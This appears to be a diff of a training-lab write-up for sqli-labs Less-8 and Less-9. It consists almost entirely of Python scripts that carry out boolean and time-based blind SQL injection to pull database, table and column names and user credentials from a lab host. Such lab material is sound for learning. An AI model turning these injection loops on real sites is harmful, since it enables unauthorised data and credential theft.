@@ -547,7 +547,9 @@ import re
 url = "http://10.12.202.251:21041/Less-8/?id="
 
 # 1 查数据库
+
 # def length():
+
 database_length = 0
 while True:
     param = "1' and length(database()) =" + str(database_length) + " #"
@@ -555,12 +557,14 @@ while True:
 
     if re.search("You are in", response):
         # print("DATABASE_LENGTH:"+str(database_length))
+        
         break
     else:
         database_length += 1
 
         
 # 尝试二分法扫描
+
 db_name = ""
 for l in range(database_length):
     a, b = 64, 64
@@ -582,6 +586,7 @@ print("db_name:" + db_name)
 
 
 # 2 查表数量
+
 print('table:')
 table_num = 0
 
@@ -592,12 +597,14 @@ while True:
 
     if re.search("You are in", response):
         # print("table_num:"+str(table_num))
+        
         break
     else:
         table_num += 1
 
 
 # 查表长度
+
 def ta_length(num):
     table_length = 0
     while True:
@@ -612,10 +619,13 @@ def ta_length(num):
 
 
 # 查表
+
 for n in range(table_num):
     table_name = ""
     for l in range(ta_length(n)):  # 表的长度
+        
         for a in range(0, 128):  # 爆破表
+            
             param = "1' and ascii(substr((select table_name from information_schema.tables where " \
                     "table_schema=database() limit " + str(n) + ",1)," + str(l + 1) + ",1)) =" + str(a) + " # "
             response = request.urlopen(url + parse.quote(param)).read().decode()
@@ -625,10 +635,13 @@ for n in range(table_num):
     print("[*]:" + table_name)
 
 # 3 查字段
+
 # 查字段个数
+
 columns_num = 0
 while True:
     # 11111
+    
     param = "1' and (select count(*) from information_schema.columns where table_name='users')=" + str(columns_num) + " #"
     response = request.urlopen(url + parse.quote(param)).read().decode()
 
@@ -640,6 +653,7 @@ while True:
 
 
 # 查每个字段的长度
+
 def co_length(num):
     columns_length = 0
     while True:
@@ -648,16 +662,20 @@ def co_length(num):
 
         if re.search("You are in", response):
             # print(columns_length)
+            
             return columns_length
         else:
             columns_length += 1
 
 
 # 查每个字段的值
+
 for n in range(columns_num):
     columns_name = ""
     for l in range(co_length(n)):  # 表的长度
+        
         for a in range(0, 128):  # 爆破表
+            
             param = "1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit " + str(n) + ",1)," + str(l + 1) + ",1)) =" + str(a) + " # "
             response = request.urlopen(url + parse.quote(param)).read().decode()
             if re.search("You are in", response):
@@ -667,7 +685,9 @@ for n in range(columns_num):
 
 
 # 下载数据
+
 # 查 username
+
 
 num = 0
 while True:
@@ -690,6 +710,7 @@ def length(num):
 
         if re.search("You are in", response):
             # print(user_length)
+            
             return user_length
         else:
             user_length += 1
@@ -699,7 +720,9 @@ def Name(value1, value2):
     for n in range(num):
         columns_name = ""
         for l in range(length(n)):  # 表的长度
+            
             for a in range(0, 128):  # 爆破表
+                
                 param = "1' and ascii(substr((select " + value1 + " from users limit " + str(n) + ",1)," + str(
                     l + 1) + ",1)) =" + str(a) + " #"
                 response = request.urlopen(url + parse.quote(param)).read().decode()
@@ -709,7 +732,9 @@ def Name(value1, value2):
         print("[*]:" + columns_name, end=":")
         columns_name2 = ""
         for l in range(length(n)):  # 表的长度
+            
             for a in range(0, 128):  # 爆破表
+                
                 param = "1' and ascii(substr((select " + value2 + " from users limit " + str(n) + ",1)," + str(
                     l + 1) + ",1)) =" + str(a) + " #"
                 response = request.urlopen(url + parse.quote(param)).read().decode()
@@ -789,6 +814,7 @@ from time import  time
 url = "http://10.12.202.251:21041/Less-9/?id="
 
 #1 查数据库
+
 database_length = 0
 while True:
     param = "1' and if(length(database())="+str(database_length)+",sleep(0.1),1) #"
@@ -816,6 +842,7 @@ for l in range(database_length):
 print("[*]:"+db_name)
 
 #2 查表数量
+
 table_num = 0
 
 while True:
@@ -829,6 +856,7 @@ while True:
         table_num += 1
 
 # 查表长度
+
 def ta_length(num):
     table_length = 0
     while True:
@@ -842,10 +870,13 @@ def ta_length(num):
             table_length += 1
 
 # 查表
+
 for n in range(table_num):
     table_name =""
     for l  in range(ta_length(n)): # 表的长度
+        
         for a in range(0,128): #爆破表
+            
             param = "1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
             t = time()
             response = request.urlopen(url + parse.quote(param))
@@ -856,7 +887,9 @@ for n in range(table_num):
 
 
 # 3 查字段
+
 # 查字段个数
+
 columns_num = 0
 while True:
     param = "1' and if((select count(*) from information_schema.columns where table_name='users')="+str(columns_num)+",sleep(0.1),1) #"
@@ -869,6 +902,7 @@ while True:
         columns_num += 1
 
 # 查每个字段的长度
+
 def co_length(num):
     columns_length = 0
     while True:
@@ -882,10 +916,13 @@ def co_length(num):
         else:
             columns_length += 1
 # 查每个字段的值
+
 for n in range(columns_num):
     columns_name =""
     for l  in range(co_length(n)): # 表的长度
+        
         for a in range(0,128): #爆破表
+            
             param = "1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
             t = time()
             response = request.urlopen(url + parse.quote(param))
@@ -897,6 +934,7 @@ for n in range(columns_num):
 # 下载数据
 
 # 查 username
+
 num = 0
 while True:
     param = "1' and if((select count(*) from users )= "+str(num)+",sleep(0.1),1)#"
@@ -926,7 +964,9 @@ def Name(value1,value2):
     for n in range(num):
         columns_name1 = columns_name2 = ""
         for l  in range(length(n)): # 表的长度
+            
             for a in range(0,128): #爆破表
+                
                 param = "1' and if(ascii(substr((select "+value1+" from users limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
                 t = time()
                 response = request.urlopen(url + parse.quote(param))
@@ -935,6 +975,7 @@ def Name(value1,value2):
                     break
 
             for a in range(0,128): #爆破表
+                
                 param = "1' and if(ascii(substr((select "+value2+" from users limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
                 t = time()
                 response = request.urlopen(url + parse.quote(param))
@@ -1263,9 +1304,6 @@ def data_value():
 
 if __name__ == "__main__":
     print("start!")
-    # database()
-    # table()
-    # column()
     data_value()
     print("end!")
 ```
